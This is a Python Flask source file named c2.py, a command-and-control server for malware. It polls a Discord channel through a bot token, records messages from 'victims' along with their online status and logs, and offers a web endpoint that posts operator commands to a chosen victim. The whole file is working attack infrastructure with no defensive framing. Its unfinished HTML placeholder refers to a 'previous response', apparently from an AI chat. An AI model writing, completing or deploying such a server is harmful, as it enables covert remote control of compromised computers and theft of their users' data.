# c2.py – Debug version (prints all messages to logs)
import os, time, json, threading, requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
if not BOT_TOKEN or not CHANNEL_ID:
    BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
    CHANNEL_ID = "YOUR_CHANNEL_ID_HERE"

DATA_FILE = "victims_data.json"
victims = {}
log_queues = {}
last_id = None

def load_data():
    global victims, log_queues
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                victims = data.get('victims', {})
                log_queues = data.get('log_queues', {})
                for vid in victims:
                    victims[vid]['last_seen'] = float(victims[vid]['last_seen'])
        except:
            pass

def save_data():
    data = {'victims': victims, 'log_queues': log_queues}
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def fetch_loop():
    global last_id, victims, log_queues
    while True:
        try:
            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=10"
            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                msgs = resp.json()
                print(f"[DEBUG] Fetched {len(msgs)} messages")
                for msg in msgs:
                    mid = msg.get("id")
                    content = msg.get("content", "")
                    print(f"[DEBUG] Message: {content[:100]}")
                    if last_id and mid == last_id:
                        print(f"[DEBUG] Skipping already seen message {mid}")
                        continue
                    if content.startswith("[") and "]" in content:
                        bracket = content.find("]")
                        victim_id = content[1:bracket]
                        rest = content[bracket+1:].strip()
                        print(f"[DEBUG] Victim: {victim_id}, rest: {rest[:50]}")
                        if victim_id not in victims:
                            victims[victim_id] = {"last_seen": time.time(), "logs": []}
                        victims[victim_id]["last_seen"] = time.time()
                        if victim_id not in log_queues:
                            log_queues[victim_id] = []
                        log_queues[victim_id].append(rest)
                        if len(log_queues[victim_id]) > 200:
                            log_queues[victim_id] = log_queues[victim_id][-200:]
                    else:
                        print(f"[DEBUG] Message does not match victim format: {content[:50]}")
                if msgs:
                    last_id = msgs[0]["id"]
                    print(f"[DEBUG] Updated last_id to {last_id}")
            else:
                print(f"[ERROR] Discord API returned {resp.status_code}: {resp.text[:200]}")
        except Exception as e:
            print(f"[ERROR] fetch_loop exception: {e}")
        time.sleep(2)

threading.Thread(target=fetch_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/victims')
def api_victims():
    vlist = []
    for vid, data in victims.items():
        vlist.append({
            "id": vid,
            "last_seen": data["last_seen"],
            "online": (time.time() - data["last_seen"]) < 70
        })
    return jsonify(vlist)

@app.route('/api/logs/<victim_id>')
def api_logs(victim_id):
    return jsonify(log_queues.get(victim_id, []))

@app.route('/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim')
    command = data.get('command')
    if not command:
        return jsonify({'success': False, 'error': 'No command'})
    final = f"{command} @{victim_id}" if victim_id else command
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"content": final}, timeout=10)
        if r.status_code == 200:
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': f"HTTP {r.status_code}"})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ---------- HTML (same as before) ----------
HTML = """... (copy from previous response, same HTML) ..."""

if __name__ == '__main__':
    load_data()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
